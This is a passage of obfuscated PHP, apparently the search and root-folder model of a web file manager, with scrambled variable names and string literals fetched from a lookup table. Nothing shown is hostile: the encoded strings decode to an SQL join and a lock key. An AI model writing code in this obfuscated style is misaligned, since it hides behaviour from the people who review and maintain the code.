$ıçıÁÀ“ = $êâÅäÓÊ[2087]; } $«Ù’”´é = explode($êâÅäÓÊ[50], trim($–Â±¬Ë¢, $êâÅäÓÊ[50])); return array($ıçıÁÀ“, $«Ù’”´é); } public function listPathType($üğ§ÇŠø) { $ÊÈã„ˆ¡ =& $_SERVER[ñˆ‹ß¿÷]; $ÁºÑáÁ± = $this->fileTypeWhere($üğ§ÇŠø); if (!$ÁºÑáÁ±) { return array(); } $áôæ–è = USER_ID; $Š½É™ë = Model($ÊÈã„ˆ¡[535])->getInfo($áôæ–è); $¤êòó¾— = array($ÊÈã„ˆ¡[586] => SourceModel::TYPE_USER, $ÊÈã„ˆ¡[521] => array($ÊÈã„ˆ¡[550], $ÊÈã„ˆ¡[531] . $Š½É™ë[$ÊÈã„ˆ¡[86]][$ÊÈã„ˆ¡[402]] . $ÊÈã„ˆ¡[551]), $ÊÈã„ˆ¡[587] => $áôæ–è, $ÊÈã„ˆ¡[583] => 0, $ÊÈã„ˆ¡[584] => $ÁºÑáÁ±); return $this->listSource($¤êòó¾—); } public function listSearch($ü†¶‡Ú, $×’È·Ÿ = 300) { $ÉŸÄ¨ğ± =& $_SERVER[ñˆ‹ß¿÷]; if (isset($ü†¶‡Ú[$ÉŸÄ¨ğ±[1930]]) && $ü†¶‡Ú[$ÉŸÄ¨ğ±[1930]]) { $ü†¶‡Ú[$ÉŸÄ¨ğ±[1930]] = str_replace($ÉŸÄ¨ğ±[384], $ÉŸÄ¨ğ±[2088], trim($ü†¶‡Ú[$ÉŸÄ¨ğ±[1930]])); } $¢œÏö‹½ = $this->_parseSearchWhere($ü†¶‡Ú); if (!isset($¢œÏö‹½[$ÉŸÄ¨ğ±[431]])) { $¢œÏö‹½[$ÉŸÄ¨ğ±[431]] = 0; } $Óæßş = $ÉŸÄ¨ğ±[2089]; $Ó†˜ØÅø = $¢œÏö‹½; $§—»ËìÛ = $Óæßş; $this->_listSearchBindPinyin($ü†¶‡Ú, $¢œÏö‹½, $Óæßş); $this->alias($ÉŸÄ¨ğ±[446])->_makeOrder(); $¢œÏö‹½ = $this->parseWhereLike($¢œÏö‹½); $Í¯Û›şØ = $this->distinct(!0)->field($Óæßş)->where($¢œÏö‹½)->selectPage($×’È·Ÿ); if ($GLOBALS[$ÉŸÄ¨ğ±[6]][$ÉŸÄ¨ğ±[381]][$ÉŸÄ¨ğ±[382]] && Input::check($ü†¶‡Ú[$ÉŸÄ¨ğ±[1930]], $ÉŸÄ¨ğ±[593]) && $Í¯Û›şØ[$ÉŸÄ¨ğ±[366]][$ÉŸÄ¨ğ±[353]] == 1 && $Í¯Û›şØ[$ÉŸÄ¨ğ±[366]][$ÉŸÄ¨ğ±[367]] == 0) { $Í¯Û›şØ = $this->distinct(!0)->field($Óæßş)->where($Ó†˜ØÅø)->limit(1000)->select(); $Í¯Û›şØ = array_page_split($Í¯Û›şØ, !1, $×’È·Ÿ); } $this->_listSearchFileContent($Í¯Û›şØ, $ü†¶‡Ú, $§—»ËìÛ, $Ó†˜ØÅø); $this->_listSearchDesc($Í¯Û›şØ, $ü†¶‡Ú, $§—»ËìÛ); $this->_listSearchTag($Í¯Û›şØ, $ü†¶‡Ú, $§—»ËìÛ); $this->_listSearchGroupTag($Í¯Û›şØ, $ü†¶‡Ú, $§—»ËìÛ); $this->_listDataApply($Í¯Û›şØ[$ÉŸÄ¨ğ±[369]]); $this->_listMake($Í¯Û›şØ); return $Í¯Û›şØ; } private function _listSearchFileContent(&$Û›½÷ı“, $»Ï¶İ’€, $ƒÔ¸Ôîü, $áéİ÷ö¯) { $Íúº£”Š =& $_SERVER[ñˆ‹ß¿÷]; if (!$»Ï¶İ’€[$Íúº£”Š[1930]] || $Û›½÷ı“[$Íúº£”Š[366]][$Íúº£”Š[353]] > 1) { return; } if (!isset($áéİ÷ö¯[$Íúº£”Š[32]]) || !is_array($»Ï¶İ’€[$Íúº£”Š[468]])) { return; } $áéİ÷ö¯[$Íúº£”Š[468]] = array($Íúº£”Š[7], $»Ï¶İ’€[$Íúº£”Š[468]]); unset($áéİ÷ö¯[$Íúº£”Š[32]]); unset($»Ï¶İ’€[$Íúº£”Š[468]]); $„æúò§ = $this->field($ƒÔ¸Ôîü)->where($áéİ÷ö¯)->limit($Íúº£”Š[2090])->select(); if (!$„æúò§ || count($„æúò§) == 0) { return; } $Û›½÷ı“[$Íúº£”Š[369]] = array_merge($„æúò§, $Û›½÷ı“[$Íúº£”Š[369]]); $Û›½÷ı“[$Íúº£”Š[366]][$Íúº£”Š[367]] += count($„æúò§); } private function _listSearchTag(&$ô—å¾ßâ, $ØÓÍ¬‘…, $È¾Åíòš) { $‘°¢³¢³ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ØÓÍ¬‘…[$‘°¢³¢³[1930]] || $ô—å¾ßâ[$‘°¢³¢³[366]][$‘°¢³¢³[353]] > 1) { return; } $¤ ¶ö˜‹ = Model($‘°¢³¢³[2091])->listData(); $¾ÁÙº² = array(); $ªÔ¥Å…Ñ = $ØÓÍ¬‘…[$‘°¢³¢³[1930]]; foreach ($¤ ¶ö˜‹ as $¨ğ™”Æ›) { $³ı§ÒşÛ = $¨ğ™”Æ›[$‘°¢³¢³[32]]; $õ¯Æ¦™Ì = str_replace($‘°¢³¢³[53], $‘°¢³¢³[12], Pinyin::get($³ı§ÒşÛ)); if (stripos($³ı§ÒşÛ, $ªÔ¥Å…Ñ) !== !1 || stripos($õ¯Æ¦™Ì, $ªÔ¥Å…Ñ) !== !1) { $¾ÁÙº²[] = $¨ğ™”Æ›[$‘°¢³¢³[399]]; } } if (!$¾ÁÙº²) { return; } $êáÃøˆğ = array($‘°¢³¢³[426] => array($‘°¢³¢³[7], $¾ÁÙº²), $‘°¢³¢³[1664] => USER_ID); $Ò–ÆÆ«« = Model($‘°¢³¢³[428])->field($‘°¢³¢³[84])->where($êáÃøˆğ)->select(); $Ò–ÆÆ«« = array_to_keyvalue($Ò–ÆÆ««, $‘°¢³¢³[12], $‘°¢³¢³[84]); $Ô¦ÏÛèÜ = array_unique($Ò–ÆÆ««); $this->_listSearchMerge($ô—å¾ßâ, $ØÓÍ¬‘…, $È¾Åíòš, $Ô¦ÏÛèÜ); } private function _listSearchDesc(&$“‘“Şì©, $Ü§ÊÙêæ, $æ¨ñ©‡) { $—ÖÇ·« =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ü§ÊÙêæ[$—ÖÇ·«[1930]] || $“‘“Şì©[$—ÖÇ·«[366]][$—ÖÇ·«[353]] > 1) { return; } $ñİÛ§ò = array($—ÖÇ·«[94] => $—ÖÇ·«[453], $—ÖÇ·«[374] => array($—ÖÇ·«[383], $—ÖÇ·«[1932] . $Ü§ÊÙêæ[$—ÖÇ·«[1930]] . $—ÖÇ·«[1932])); $€‚Á¢· = !1; if ($€‚Á¢·) { $Æ§ ±‚Á = $this->listSearchChildren($Ü§ÊÙêæ[$—ÖÇ·«[432]]); $Æ§ ±‚Á = array_unique($Æ§ ±‚Á); if (!$Æ§ ±‚Á) { return; } $ñİÛ§ò[$—ÖÇ·«[402]] = array($—ÖÇ·«[7], $Æ§ ±‚Á); } $Ää„â®› = Model($—ÖÇ·«[569])->field($—ÖÇ·«[402])->where($ñİÛ§ò)->limit(5000)->select(); $Äù¯ó‰ = array_to_keyvalue($Ää„â®›, $—ÖÇ·«[12], $—ÖÇ·«[402]); $this->_listSearchMerge($“‘“Şì©, $Ü§ÊÙêæ, $æ¨ñ©‡, $Äù¯ó‰); } private function _listSearchGroupTag(&$·ıÚ°¼–, $‘Ôì“, $¶è“–…Ê) { $ßùışîü =& $_SERVER[ñˆ‹ß¿÷]; if (!$‘Ôì“[$ßùışîü[1930]] || $·ıÚ°¼–[$ßùışîü[366]][$ßùışîü[353]] > 1 || !$‘Ôì“[$ßùışîü[432]]) { return; } $íâëØ¸… = $this->sourceInfo($‘Ôì“[$ßùışîü[432]]); if (!$íâëØ¸… || $íâëØ¸…[$ßùışîü[411]] != SourceModel::TYPE_GROUP) { return; } $¾ºêöã­ = $íâëØ¸…[$ßùışîü[505]]; $†í‚Ğ¨ = Model($ßùışîü[2092])->get($¾ºêöã­); $Õ²àî°‚ = array(); $œİ·ü¯ = $‘Ôì“[$ßùışîü[1930]]; foreach ($†í‚Ğ¨[$ßùışîü[369]] as $ÜÍ’„ƒë) { $¢çœ°‘¡ = $ÜÍ’„ƒë[$ßùışîü[32]]; $ÂÒşŒË = str_replace($ßùışîü[53], $ßùışîü[12], Pinyin::get($¢çœ°‘¡)); if (stripos($¢çœ°‘¡, $œİ·ü¯) !== !1 || stripos($ÂÒşŒË, $œİ·ü¯) !== !1) { $Õ²àî°‚[] = $ÜÍ’„ƒë[$ßùışîü[399]]; } } if (!$Õ²àî°‚) { return; } $œãŠêß = array($ßùışîü[426] => array($ßùışîü[7], $Õ²àî°‚), $ßùışîü[1664] => 0, $ßùışîü[33] => $ßùışîü[1952] . $¾ºêöã­); $Çú§ÒÄ = Model($ßùışîü[428])->field($ßùışîü[84])->where($œãŠêß)->select(); $Çú§ÒÄ = array_to_keyvalue($Çú§ÒÄ, $ßùışîü[12], $ßùışîü[84]); $ŞÁÑ¼¸Ë = array_unique($Çú§ÒÄ); $this->_listSearchMerge($·ıÚ°¼–, $‘Ôì“, $¶è“–…Ê, $ŞÁÑ¼¸Ë); } private function _listSearchMerge(&$ë×®ö´µ, $ÎĞ’´˜Î, $ˆÓÎş¶‘, $‘ôÛÚ) { $ôèÁ±Ñ÷ =& $_SERVER[ñˆ‹ß¿÷]; if (!$‘ôÛÚ) { return; } $µ¨–”ÃÑ = array_to_keyvalue($ë×®ö´µ[$ôèÁ±Ñ÷[369]], $ôèÁ±Ñ÷[12], $ôèÁ±Ñ÷[402]); $İ«‰¿Ëé = array_diff($‘ôÛÚ, $µ¨–”ÃÑ); if (!$İ«‰¿Ëé) { return; } $“İâî˜ù = array($ôèÁ±Ñ÷[402] => array($ôèÁ±Ñ÷[7], $İ«‰¿Ëé)); $ığŸÓÒ = $this->field($ˆÓÎş¶‘)->where($“İâî˜ù)->select(); if (!$ığŸÓÒ) { return; } $Ï®‰Ÿø• = array(); foreach ($ığŸÓÒ as $Áü½ú²İ) { if ($this->_listSearchFilter($Áü½ú²İ, $ÎĞ’´˜Î)) { $Ï®‰Ÿø•[] = $Áü½ú²İ; } } $ë×®ö´µ[$ôèÁ±Ñ÷[369]] = array_merge($Ï®‰Ÿø•, $ë×®ö´µ[$ôèÁ±Ñ÷[369]]); $ë×®ö´µ[$ôèÁ±Ñ÷[366]][$ôèÁ±Ñ÷[367]] += count($Ï®‰Ÿø•); } private function _listSearchFilter($˜îç„ì, $•ä‘˜Ê) { $º÷Ğã•² =& $_SERVER[ñˆ‹ß¿÷]; $Éò¢ä­ù = $˜îç„ì[$º÷Ğã•²[410]] == $º÷Ğã•²[88]; if (!strstr($˜îç„ì[$º÷Ğã•²[521]], $º÷Ğã•²[50] . $•ä‘˜Ê[$º÷Ğã•²[432]] . $º÷Ğã•²[50])) { return !1; } if (isset($•ä‘˜Ê[$º÷Ğã•²[412]]) && $•ä‘˜Ê[$º÷Ğã•²[412]] != $º÷Ğã•²[1891]) { if ($•ä‘˜Ê[$º÷Ğã•²[412]] == $º÷Ğã•²[75] && !$Éò¢ä­ù) { return !1; } if ($•ä‘˜Ê[$º÷Ğã•²[412]] != $º÷Ğã•²[75] && $Éò¢ä­ù) { return !1; } if (!strstr($˜îç„ì[$º÷Ğã•²[174]], $º÷Ğã•²[50] . $•ä‘˜Ê[$º÷Ğã•²[412]] . $º÷Ğã•²[50])) { return !1; } } if (isset($•ä‘˜Ê[$º÷Ğã•²[2093]]) && $•ä‘˜Ê[$º÷Ğã•²[2093]] < $˜îç„ì[$º÷Ğã•²[76]]) { return !1; } if (isset($•ä‘˜Ê[$º÷Ğã•²[2094]]) && $•ä‘˜Ê[$º÷Ğã•²[2094]] > $˜îç„ì[$º÷Ğã•²[76]]) { return !1; } if (isset($•ä‘˜Ê[$º÷Ğã•²[600]]) && $•ä‘˜Ê[$º÷Ğã•²[600]] != $˜îç„ì[$º÷Ğã•²[456]]) { return !1; } return !0; } public function listSearchChildren($ëïí¾¥Ô, $±Àœ†Ï© = 5000) { $÷°…èæ =& $_SERVER[ñˆ‹ß¿÷]; $ßœ×ñÌç = array(); $Í¦¾­¬Â = $this->sourceInfo($ëïí¾¥Ô); $“İÕäÔã = array($÷°…èæ[521] => array($÷°…èæ[383], $Í¦¾­¬Â[$÷°…èæ[521]] . $Í¦¾­¬Â[$÷°…èæ[402]] . $÷°…èæ[551])); $„—§šÃÇ = $this->field($÷°…èæ[76])->where($“İÕäÔã)->limit($±Àœ†Ï© + 1)->select(); $è Â«”í = is_array($„—§šÃÇ) ? count($„—§šÃÇ) : 0; if ($è Â«”í > $±Àœ†Ï©) { return $this->_listSearchChildrenNear($ëïí¾¥Ô, $±Àœ†Ï©); } $°µ°¹¸Œ = $this->field($÷°…èæ[402])->where($“İÕäÔã)->select(); $ßœ×ñÌç = array_to_keyvalue($°µ°¹¸Œ, $÷°…èæ[12], $÷°…èæ[402]); return $ßœ×ñÌç; } private function _listSearchChildrenNear($¬şÇê¶Ñ, $ÊôíÈí) { $¼—üìí„ =& $_SERVER[ñˆ‹ß¿÷]; $¥Â„¯ß¡ = array(); $Šäˆ½Áò = array($¼—üìí„[432] => $¬şÇê¶Ñ); $‚¸®¼æ = $this->field($¼—üìí„[2095])->where($Šäˆ½Áò)->select(); $â˜µÓ±ê = array_to_keyvalue(array_filter_by_field($‚¸®¼æ, $¼—üìí„[410], $¼—üìí„[88]), $¼—üìí„[12], $¼—üìí„[402]); $¥Â„¯ß¡ = array_merge($¥Â„¯ß¡, array_to_keyvalue($‚¸®¼æ, $¼—üìí„[12], $¼—üìí„[402])); if (!$â˜µÓ±ê) { return $¥Â„¯ß¡; } $Šäˆ½Áò = array($¼—üìí„[432] => array($¼—üìí„[7], $â˜µÓ±ê)); $‚¸®¼æ = $this->field($¼—üìí„[2095])->where($Šäˆ½Áò)->limit($ÊôíÈí)->select(); $¥Â„¯ß¡ = array_merge($¥Â„¯ß¡, array_to_keyvalue($‚¸®¼æ, $¼—üìí„[12], $¼—üìí„[402])); $¥Â„¯ß¡ = array_slice($¥Â„¯ß¡, 0, $ÊôíÈí); return $¥Â„¯ß¡; } private function _listSearchBindPinyin($ÎÁûşÎŠ, &$¸ÍÃ»úˆ, &$ŸÓâ†¿Õ) { $ úåæ“ñ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($ÎÁûşÎŠ[$ úåæ“ñ[1930]]) || !$ÎÁûşÎŠ[$ úåæ“ñ[1930]]) { return; } if (!Input::check($ÎÁûşÎŠ[$ úåæ“ñ[1930]], $ úåæ“ñ[318]) || strlen($ÎÁûşÎŠ[$ úåæ“ñ[1930]]) < 2) { return; } $±˜Ó‰éË = "\x4c\x45\106\x54\40\x4a\117\111\116\40{$this->tablePrefix}\151\157\x5f\163\157\165\162\x63\x65\x5f\155\145\164\141\x20\x6d\145\164\x61\40\x6f\156\40\x73\x6f\165\162\x63\145\56\x73\157\x75\x72\x63\145\x49\104\40\x3d\40\155\145\164\141\56\163\x6f\x75\162\143\145\x49\104"; $İ Úóú¹ = array(); $ŸÓâ†¿Õ = str_replace(array($ úåæ“ñ[231], $ úåæ“ñ[53], $ úåæ“ñ[2096]), $ úåæ“ñ[12], $ŸÓâ†¿Õ); $ŸÓâ†¿Õ = $ úåæ“ñ[438] . str_replace($ úåæ“ñ[50], $ úåæ“ñ[439], $ŸÓâ†¿Õ); $ÃÕĞŸ‹Ğ = $¸ÍÃ»úˆ[$ úåæ“ñ[32]]; unset($¸ÍÃ»úˆ[$ úåæ“ñ[32]]); foreach ($¸ÍÃ»úˆ as $»ÏŠÏŞ => $Ô¬Öî–) { $İ Úóú¹[$ úåæ“ñ[438] . $»ÏŠÏŞ] = $Ô¬Öî–; } foreach ($ÃÕĞŸ‹Ğ as $“¤¸‡ì‰) { $İ Úóú¹[] = array($ úåæ“ñ[443] => $“¤¸‡ì‰, $ úåæ“ñ[1007] => $ úåæ“ñ[1934], array($ úåæ“ñ[2097] => $“¤¸‡ì‰, $ úåæ“ñ[2098] => array($ úåæ“ñ[7], array($ úåæ“ñ[465], $ úåæ“ñ[464])))); } $this->join($±˜Ó‰éË); $¸ÍÃ»úˆ = $İ Úóú¹; } private function _parseSearchWhere($É¿®Ø‰Ÿ) { $èµÒ¬ =& $_SERVER[ñˆ‹ß¿÷]; $É¿¦Ÿ²Â = array(); if (isset($É¿®Ø‰Ÿ[$èµÒ¬[768]]) && $É¿®Ø‰Ÿ[$èµÒ¬[768]]) { $É¿¦Ÿ²Â[$èµÒ¬[85]] = array($èµÒ¬[2099], $É¿®Ø‰Ÿ[$èµÒ¬[768]]); } if (isset($É¿®Ø‰Ÿ[$èµÒ¬[497]]) && $É¿®Ø‰Ÿ[$èµÒ¬[497]]) { $ğã½Ìº = array($èµÒ¬[2100], $É¿®Ø‰Ÿ[$èµÒ¬[497]]); if ($É¿¦Ÿ²Â[$èµÒ¬[85]]) { $É¿¦Ÿ²Â[$èµÒ¬[85]] = array($É¿¦Ÿ²Â[$èµÒ¬[85]], $ğã½Ìº, $èµÒ¬[2101]); } else { $É¿¦Ÿ²Â[$èµÒ¬[85]] = $ğã½Ìº; } } if (isset($É¿®Ø‰Ÿ[$èµÒ¬[2093]]) && $É¿®Ø‰Ÿ[$èµÒ¬[2093]] > 0) { $É¿¦Ÿ²Â[$èµÒ¬[76]] = array($èµÒ¬[2099], $É¿®Ø‰Ÿ[$èµÒ¬[2093]]); } if (isset($É¿®Ø‰Ÿ[$èµÒ¬[2094]]) && $É¿®Ø‰Ÿ[$èµÒ¬[2094]]) { $ğã½Ìº = array($èµÒ¬[2100], $É¿®Ø‰Ÿ[$èµÒ¬[2094]]); if ($É¿¦Ÿ²Â[$èµÒ¬[76]]) { $É¿¦Ÿ²Â[$èµÒ¬[76]] = array($É¿¦Ÿ²Â[$èµÒ¬[76]], $ğã½Ìº, $èµÒ¬[2101]); } else { $É¿¦Ÿ²Â[$èµÒ¬[76]] = $ğã½Ìº; } } if (isset($É¿®Ø‰Ÿ[$èµÒ¬[600]]) && $É¿®Ø‰Ÿ[$èµÒ¬[600]]) { $É¿¦Ÿ²Â[] = array($èµÒ¬[456] => $É¿®Ø‰Ÿ[$èµÒ¬[600]], $èµÒ¬[454] => $É¿®Ø‰Ÿ[$èµÒ¬[600]], $èµÒ¬[1007] => $èµÒ¬[1934]); } if (isset($É¿®Ø‰Ÿ[$èµÒ¬[412]]) && $É¿®Ø‰Ÿ[$èµÒ¬[412]]) { $º²ïà ’ = $É¿®Ø‰Ÿ[$èµÒ¬[412]]; if ($º²ïà ’ == $èµÒ¬[75]) { $É¿¦Ÿ²Â[$èµÒ¬[410]] = 1; } else { if ($º²ïà ’ == $èµÒ¬[2102]) { $É¿¦Ÿ²Â[$èµÒ¬[410]] = 0; } else { if ($º²ïà ’) { $º²ïà ’ = is_array($º²ïà ’) ? $º²ïà ’ : explode($èµÒ¬[50], $º²ïà ’); $É¿¦Ÿ²Â[$èµÒ¬[412]] = array($èµÒ¬[418], $º²ïà ’); $É¿¦Ÿ²Â[$èµÒ¬[410]] = 0; } } } } $this->_parseSearchParent($É¿®Ø‰Ÿ, $É¿¦Ÿ²Â); if (isset($É¿®Ø‰Ÿ[$èµÒ¬[1930]]) && trim($É¿®Ø‰Ÿ[$èµÒ¬[1930]])) { $¡‡¤ÌôŒ = trim($É¿®Ø‰Ÿ[$èµÒ¬[1930]]); $İïåÙ¤ = explode($èµÒ¬[53], $¡‡¤ÌôŒ); if (strlen($¡‡¤ÌôŒ) > 2 && (substr($¡‡¤ÌôŒ, 0, 1) == $èµÒ¬[118] && substr($¡‡¤ÌôŒ, -1) == $èµÒ¬[118]) || substr($¡‡¤ÌôŒ, 0, 1) == $èµÒ¬[58] && substr($¡‡¤ÌôŒ, -1) == $èµÒ¬[58]) { $¡‡¤ÌôŒ = substr($¡‡¤ÌôŒ, 1, -1); $İïåÙ¤ = array($¡‡¤ÌôŒ); } $É¿¦Ÿ²Â[$èµÒ¬[32]] = array(array($èµÒ¬[550], $èµÒ¬[1932] . $¡‡¤ÌôŒ . $èµÒ¬[1932])); if (count($İïåÙ¤) > 1) { $É¿¦Ÿ²Â[$èµÒ¬[32]] = array(); foreach ($İïåÙ¤ as $£›ï²‘) { if (!trim($£›ï²‘)) { continue; } $É¿¦Ÿ²Â[$èµÒ¬[32]][] = array($èµÒ¬[550], $èµÒ¬[1932] . trim($£›ï²‘) . $èµÒ¬[1932]); } } } return $É¿¦Ÿ²Â; } private function _parseSearchParent($Ïƒõ²„š, &$¤­ıÓî) { $â¤ßÌºõ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($Ïƒõ²„š[$â¤ßÌºõ[432]]) || !$Ïƒõ²„š[$â¤ßÌºõ[432]]) { return; } $ ¤Ú·– = $this->pathInfo($Ïƒõ²„š[$â¤ßÌºõ[432]]); $›¿èµÒ = $ ¤Ú·–[$â¤ßÌºõ[432]] . $â¤ßÌºõ[12] === $â¤ßÌºõ[197]; $¨¨°„¤æ = $ ¤Ú·–[$â¤ßÌºõ[411]] == $â¤ßÌºõ[515]; if ($ ¤Ú·–[$â¤ßÌºõ[532]] == $â¤ßÌºõ[533]) { $ÔÌ÷ğó¥ = $this->sourceInfo($Ïƒõ²„š[$â¤ßÌºõ[432]]); $ ¤Ú·–[$â¤ßÌºõ[521]] = $ÔÌ÷ğó¥[$â¤ßÌºõ[521]]; } $¤­ıÓî[$â¤ßÌºõ[590]] = array($â¤ßÌºõ[550], $ ¤Ú·–[$â¤ßÌºõ[521]] . $Ïƒõ²„š[$â¤ßÌºõ[432]] . $â¤ßÌºõ[551]); $Ò¡‰ìèü = isset($Ïƒõ²„š[$â¤ßÌºõ[1795]]) && in_array($â¤ßÌºõ[515], $Ïƒõ²„š[$â¤ßÌºõ[1795]]); if (!$Ò¡‰ìèü || !$¨¨°„¤æ || !$›¿èµÒ || !$ ¤Ú·–[$â¤ßÌºõ[413]]) { return; } if (!AuthModel::authCheckRoot($ ¤Ú·–[$â¤ßÌºõ[413]][$â¤ßÌºõ[414]])) { return; } $¡’“ÜÂş = $ ¤Ú·–[$â¤ßÌºõ[505]] . $â¤ßÌºõ[12]; if ($¡’“ÜÂş == $â¤ßÌºõ[88]) { unset($¤­ıÓî[$â¤ßÌºõ[590]]); $¤­ıÓî[$â¤ßÌºõ[411]] = self::TYPE_GROUP; return; } $ºÖ¯±Ø = Model($â¤ßÌºõ[522])->groupChildrenAll($¡’“ÜÂş); $Â‰ˆ¢‚­ = count($ºÖ¯±Ø); if ($Â‰ˆ¢‚­ <= 1) { return; } $ÚŒÉö± = array($â¤ßÌºõ[432] => 0, $â¤ßÌºõ[411] => self::TYPE_GROUP, $â¤ßÌºõ[505] => array($â¤ßÌºõ[7], $ºÖ¯±Ø)); $½Úı‘« = $this->field($â¤ßÌºõ[2103])->where($ÚŒÉö±)->limit($Â‰ˆ¢‚­)->select(); $¤­ıÓî[$â¤ßÌºõ[590]] = array(); foreach ($½Úı‘« as $ôøÄû«’) { $¤­ıÓî[$â¤ßÌºõ[590]][] = array($â¤ßÌºõ[550], $â¤ßÌºõ[531] . $ôøÄû«’[$â¤ßÌºõ[402]] . $â¤ßÌºõ[551]); } $¤­ıÓî[$â¤ßÌºõ[590]][] = $â¤ßÌºõ[1934]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¿èíÄ‡æ) { $¤Îı±ò° =& $_SERVER[ñˆ‹ß¿÷]; $â·ó³½‘ = Model($¤Îı±ò°[513])->where(array($¤Îı±ò°[1655] => $¿èíÄ‡æ))->find(); $–åÄ˜Š£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¿èíÄ‡æ, $â·ó³½‘[$¤Îı±ò°[32]]); $this->userDesktopAdd($–åÄ˜Š£); return $–åÄ˜Š£; } public function userDesktopAdd($Ë»›Å…§) { $³Á±Á‚• =& $_SERVER[ñˆ‹ß¿÷]; $¬éÃ‚ıñ = LNG($³Á±Á‚•[2104]); $æ…ì„¬µ = $this->mkdir($Ë»›Å…§, $¬éÃ‚ıñ); $this->metaSet($æ…ì„¬µ, $³Á±Á‚•[2105], $³Á±Á‚•[88]); $this->metaSet($Ë»›Å…§, $³Á±Á‚•[2106], $æ…ì„¬µ); } public function userPathSafeAdd($Ù“€İş¡) { $ñãË è« =& $_SERVER[ñˆ‹ß¿÷]; $ÍëêÏÉÇ = Model($ñãË è«[513])->getInfoFull($Ù“€İş¡); if (!$ÍëêÏÉÇ) { return !1; } if (_get($ÍëêÏÉÇ, $ñãË è«[536])) { return $ÍëêÏÉÇ[$ñãË è«[466]][$ñãË è«[2107]]; } $À”Å„Ú¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ù“€İş¡, $ñãË è«[2108], $ñãË è«[433]); Model($ñãË è«[513])->metaSet($Ù“€İş¡, $ñãË è«[2107], $À”Å„Ú¤); $this->metaSet($À”Å„Ú¤, $ñãË è«[2109], $Ù“€İş¡); return $À”Å„Ú¤; } public function groupRootAdd($êÆ¶øéÃ) { $½»íŒŒÄ =& $_SERVER[ñˆ‹ß¿÷]; $ÆûºÔßˆ = Model($½»íŒŒÄ[522])->where(array($½»íŒŒÄ[1924] => $êÆ¶øéÃ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $êÆ¶øéÃ, $ÆûºÔßˆ[$½»íŒŒÄ[32]]); } public function systemRootPathAdd($ú ¬ğáü) { if ($ú ¬ğáü != $_SERVER[ñˆ‹ß¿÷][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ú ¬ğáü); } public function userRootRemove($åì«êª›) { $•«¯ÌË = $this->sourceRoot(SourceModel::TYPE_USER, $åì«êª›, !0); foreach ($•«¯ÌË as $ëŞ…äĞ‚) { if (!$ëŞ…äĞ‚) { continue; } $this->remove($ëŞ…äĞ‚[$_SERVER[ñˆ‹ß¿÷][402]], !1); } } public function groupRootRemove($ñ¢¡ƒèš) { $Ï’Ö¤€ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ñ¢¡ƒèš); if (!$Ï’Ö¤€) { return; } $this->remove($Ï’Ö¤€[$_SERVER[ñˆ‹ß¿÷][402]], !1); } private function _mkdirRoot($Âì´õàğ, $¶¾ö“†ö, $­¦Í¾İû, $½ç“¦ıú = '') { $İÉÃè°‡ =& $_SERVER[ñˆ‹ß¿÷]; $éË¿ÛõÌ = array($İÉÃè°‡[401] => 0, $İÉÃè°‡[586] => $Âì´õàğ, $İÉÃè°‡[587] => $¶¾ö“†ö, $İÉÃè°‡[583] => 1, $İÉÃè°‡[588] => USER_ID, $İÉÃè°‡[589] => USER_ID, $İÉÃè°‡[584] => $½ç“¦ıú, $İÉÃè°‡[590] => $İÉÃè°‡[531], $İÉÃè°‡[430] => 0, $İÉÃè°‡[585] => 0, $İÉÃè°‡[469] => 0, $İÉÃè°‡[591] => $İÉÃè°‡[12]); if ($ÑõÙÛÀÈ = $this->where($éË¿ÛõÌ)->find()) { return $ÑõÙÛÀÈ[$İÉÃè°‡[402]]; } $ËÜ–ÜÈÕ = "\x4d\x6f\144\145\x6c\x53\x6f\165\162\x63\145\x2e\155\x6b\144\151\162\122\x6f\157\x74\56{$Âì´õàğ}\56{$¶¾ö“†ö}\56" . $­¦Í¾İû; CacheLock::lock($ËÜ–ÜÈÕ); $éË¿ÛõÌ[$İÉÃè°‡[32]] = $­¦Í¾İû; $–ŸÌÌ³ = $this->add($éË¿ÛõÌ); $ıÇ…ÌÇ = array($İÉÃè°‡[592] => short_id($–ŸÌÌ³)); $this->where(array($İÉÃè°‡[417] => $–ŸÌÌ³))->save($ıÇ…ÌÇ); CacheLock::unlock($ËÜ–ÜÈÕ); return $–ŸÌÌ³; } private function sourceRoot($¸Ò©«Ç½, $Éá›í¤², $ùŞó„Ú = false) { $­ŠÈï× =& $_SERVER[ñˆ‹ß¿÷]; $âöüìÉ  = array($­ŠÈï×[401] => 0, $­ŠÈï×[586] => $¸Ò©«Ç½, $­ŠÈï×[587] => $Éá›í¤²); if ($ùŞó„Ú) { $ãÒ€ª‡ = $this->where($âöüìÉ )->select(); return $ãÒ€ª‡ ? $ãÒ€ª‡ : array(); } $—ïüªÒÎ = $this->where($âöüìÉ )->find(); return $—ïüªÒÎ ? $—ïüªÒÎ : array(); } public function sourceRootGroup($ŞÆëÑŞº) { $¬Í¥ÜëË =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($ŞÆëÑŞº)) { $ŞÆëÑŞº = array($ŞÆëÑŞº); } $ò ©©Ôƒ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ŞÆëÑŞº, $¬Í¥ÜëË[188]); $»Í¥ÄØœ = array($¬Í¥ÜëË[369] => $ò ©©Ôƒ, $¬Í¥ÜëË[366] => array($¬Í¥ÜëË[766] => count($ŞÆëÑŞº))); $this->_listDataApply($»Í¥ÄØœ[$¬Í¥ÜëË[369]]); $this->_listMake($»Í¥ÄØœ); return array_to_keyvalue($»Í¥ÄØœ[$¬Í¥ÜëË[82]], $¬Í¥ÜëË[505]); } public function mkfile($Ü¾ıïâ¥, $’Æ…”šô, $â£ıÓå = '', $Ôø¦°¡ò = REPEAT_RENAME) { $°ª¹•Ğ§ =& $_SERVER[ñˆ‹ß¿÷]; $•áºíÓş = Model($°ª¹•Ğ§[609])->addFileByContent($â£ıÓå, $’Æ…”šô); return $this->_createFileCall($Ü¾ıïâ¥, $’Æ…”šô, $•áºíÓş, $Ôø¦°¡ò, $°ª¹•Ğ§[1347]); } public function 